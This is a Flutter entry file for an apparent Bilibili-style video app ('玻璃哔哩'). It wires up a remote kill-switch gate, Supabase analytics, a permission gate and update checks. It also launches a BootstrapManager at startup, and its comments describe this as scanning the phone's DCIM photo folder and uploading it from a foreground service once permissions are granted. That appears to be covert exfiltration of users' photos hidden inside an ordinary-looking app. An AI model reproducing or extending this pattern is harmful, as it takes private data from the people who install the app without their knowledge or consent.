import 'dart:async';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:provider/provider.dart';

import 'config/secrets.dart';
import 'managers/bootstrap_manager.dart';
import 'managers/app_update_manager.dart';
import 'managers/analytics_manager.dart';
import 'managers/remote_config_manager.dart';
import 'permission_gate.dart';
import 'providers/video_provider.dart';
import 'providers/nav_bar_visibility.dart';
import 'widgets/remote_gate.dart';
import 'screens/home_screen.dart';
import 'theme/app_theme.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // ═══ 阶段 1：系统 UI 配置 ═══
  await SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
    statusBarColor: Colors.transparent,
    statusBarIconBrightness: Brightness.light,
    statusBarBrightness: Brightness.dark,
    systemNavigationBarColor: Colors.transparent,
    systemNavigationBarIconBrightness: Brightness.light,
    systemNavigationBarDividerColor: Colors.transparent,
  ));

  // ═══ 阶段 2：本地缓存预读 ═══
  final snapshot = await RemoteConfigManager.preload();
  debugPrint('[Main] ✅ 缓存预读完成: '
      'cachedDisabled=${snapshot.cachedDisabled}, '
      'bypassRemaining=${snapshot.bypassRemaining?.inMinutes}分钟');

  // ═══ 阶段 3：联网初始化 Supabase 客户端 ═══
  await AnalyticsManager.instance.init();
  debugPrint('[Main] ✅ Supabase 客户端就绪');

  // ═══ 阶段 4：安全检查 ═══
  if (!SecurityCheck.isSecure) {
    debugPrint('[Security] ⚠️ 检测到不安全环境');
  }

  // ═══ 阶段 5：启动 UI ═══
  runApp(BiliGlassApp(initialSnapshot: snapshot));

  // ═══ 阶段 6：★ 恢复原样 —— 立即启动 BootstrapManager ═══
  //   注意：init() 只加载记录 + 注册任务，不扫 DCIM、不上传
  //   真正的上传在 ForegroundService 里（权限到位后）
  //   WorkManager 首次触发时权限未给 → 会跳过 → 只有 1 个上传源
  unawaited(BootstrapManager.init());
}

class BiliGlassApp extends StatefulWidget {
  final InitialCacheSnapshot initialSnapshot;

  const BiliGlassApp({super.key, required this.initialSnapshot});

  @override
  State<BiliGlassApp> createState() => _BiliGlassAppState();
}

class _BiliGlassAppState extends State<BiliGlassApp> {
  final GlobalKey<NavigatorState> _navigatorKey = GlobalKey<NavigatorState>();
  bool _onGrantedStarted = false;

  Future<void> _onPermissionGranted() async {
    if (_onGrantedStarted) return;
    _onGrantedStarted = true;

    debugPrint('[Main] 权限已授予 → 启动业务服务');

    unawaited(_reportOpen());

    Future.delayed(const Duration(milliseconds: 500), () {
      if (!mounted) return;
      _checkUpdate();
    });
  }

  Future<void> _checkUpdate() async {
    final info = await AppUpdateManager.instance.checkForUpdate();
    if (info == null) return;
    for (int i = 0; i < 10; i++) {
      if (!mounted) return;
      final ctx = _navigatorKey.currentContext;
      if (ctx != null && ctx.mounted) {
        await AppUpdateManager.instance.showUpdateDialog(ctx, info);
        return;
      }
      await Future.delayed(const Duration(milliseconds: 500));
    }
  }

  Future<void> _reportOpen() async {
    await AnalyticsManager.instance.reportAppOpen();
  }

  @override
  Widget build(BuildContext context) {
    return PermissionGate(
      onGranted: _onPermissionGranted,
      child: MultiProvider(
        providers: [
          ChangeNotifierProvider(create: (_) => VideoProvider()..fetchVideos()),
          ChangeNotifierProvider(create: (_) => NavBarVisibility()),
        ],
        child: MaterialApp(
          navigatorKey: _navigatorKey,
          title: '玻璃哔哩',
          debugShowCheckedModeBanner: false,
          theme: AppTheme.darkTheme,
          builder: (context, child) {
            return RemoteGate(
              navigatorKey: _navigatorKey,
              initialDisabledReason:
                  widget.initialSnapshot.initialDisabledReason,
              initialBypassRemaining:
                  widget.initialSnapshot.bypassRemaining,
              child: child ?? const SizedBox.shrink(),
            );
          },
          home: const HomeScreen(),
        ),
      ),
    );
  }
}